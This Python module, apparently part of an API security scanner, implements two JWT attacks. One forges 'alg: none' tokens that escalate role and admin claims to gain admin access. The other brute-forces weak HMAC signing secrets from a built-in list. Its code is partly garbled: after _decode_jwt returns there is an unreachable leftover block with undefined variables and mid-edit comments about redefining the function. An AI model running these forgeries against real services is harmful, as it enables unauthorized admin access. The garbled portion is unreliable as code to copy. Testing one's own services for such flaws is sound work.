from typing import Any, Dict
import base64
import json
from ..http_client import HttpClient
from ..scenarios import FlowScenario, SimpleScenario 
# Note: JWT attacks usually require a captured token, so this fits best in a Flow 
# OR a SimpleScenario where we explicitly provided a token in config. 
# But to make it "Real", we should modify an existing token.

def _b64url_encode(data: Dict) -> str:
    json_str = json.dumps(data, separators=(",", ":"))
    encoded = base64.urlsafe_b64encode(json_str.encode()).decode().rstrip("=")
    return encoded

def _decode_jwt(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        return None, None
    try:
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
        return header, payload
    except:
        return None, None

    if not base_token or base_token.startswith("{{"):
        return {
            "scenario_id": scenario.id,
            "passed": True, 
            "skipped": True,
            "details": "No valid JWT token provided in config. Cannot perform attack."
        }

    header, payload = _decode_jwt(base_token)
    # ... rest of run_jwt_attack ... (keep existing logic but remove the dummy fallback)

    # (Actually I need to replace the whole function to remove the dummy block cleanly)
    # Redefine run_jwt_attack below

def run_jwt_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    JWT None Algorithm & Weak Signature Attack.
    Requires a valid 'base_token' in config.
    """
    base_token = scenario.config.get("token")
    if not base_token or base_token.startswith("{{"):
         return {
            "scenario_id": scenario.id,
            "passed": True,
            "skipped": True, 
            "details": "No JWT token provided. Skipping attack."
        }

    header, payload = _decode_jwt(base_token)
    if not header:
        return {
            "scenario_id": scenario.id,
            "passed": True, 
            "details": "Base token is not a valid JWT (cannot attack)"
        }
    
    issues = []
    leaked_data = [] 
    
    # ATTACK 1: The "None" Algorithm
    rogue_header = header.copy()
    rogue_header["alg"] = "none"
    
    rogue_payload = payload.copy()
    # Try to become admin
    for key in ["role", "user", "is_admin", "admin", "groups", "permissions"]:
        if key in rogue_payload:
            rogue_payload[key] = "admin" if isinstance(rogue_payload[key], str) else True

    # Forging token
    fake_token = f"{_b64url_encode(rogue_header)}.{_b64url_encode(rogue_payload)}."
    
    try:
        resp = client.send(
            scenario.method, 
            scenario.target, 
            headers={"Authorization": f"Bearer {fake_token}"}
        )
        
        baseline_resp = client.send(scenario.method, scenario.target)

        if resp.status_code == 200 and baseline_resp.status_code != 200:
            issues.append(f"JWT 'None' Algo Exploit Successful (Status 200 vs {baseline_resp.status_code})")
            leaked_data.append(f"Forged Admin Token: {fake_token}")
            
    except Exception as e:
        pass # Connection error handles elsewhere

    return {
        "scenario_id": scenario.id,
        "attack_type": "jwt_weakness",
        "passed": len(issues) == 0,
        "details": {
            "issues": issues,
            "leaked_data": leaked_data
        }
    }

def run_jwt_brute(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Online/Inline JWT Secret Brute Force (HMAC).
    """
    base_token = scenario.config.get("token")
    if not base_token: return {"scenario_id": scenario.id, "passed": True, "skipped": True, "details": "No token"}

    import hmac
    import hashlib

    # Common weak secrets
    secrets = ["secret", "password", "123456", "admin", "jwt_secret", "api_secret", "key", "testing"]
    
    parts = base_token.split(".")
    if len(parts) != 3: return {"scenario_id": scenario.id, "passed": True, "details": "Invalid JWT"}
    
    msg = f"{parts[0]}.{parts[1]}".encode()
    signature_b64 = parts[2]
    # Adjust padding for signature if needed
    signature_b64 += "=" * ((4 - len(signature_b64) % 4) % 4)
    try:
        original_sig = base64.urlsafe_b64decode(signature_b64)
    except:
        return {"scenario_id": scenario.id, "passed": True, "details": "Signature decode fail"}

    cracked = None
    
    for s in secrets:
        sig = hmac.new(s.encode(), msg, hashlib.sha256).digest()
        if sig == original_sig:
            cracked = s
            break
            
    if cracked:
        return {
            "scenario_id": scenario.id,
            "attack_type": "jwt_brute",
            "passed": False,
            "details": f"CRITICAL: JWT Secret key cracked! Key: '{cracked}'"
        }
    
    return {
        "scenario_id": scenario.id,
        "attack_type": "jwt_brute",
        "passed": True,
        "details": "JWT Secret not found in common dictionary."
    }
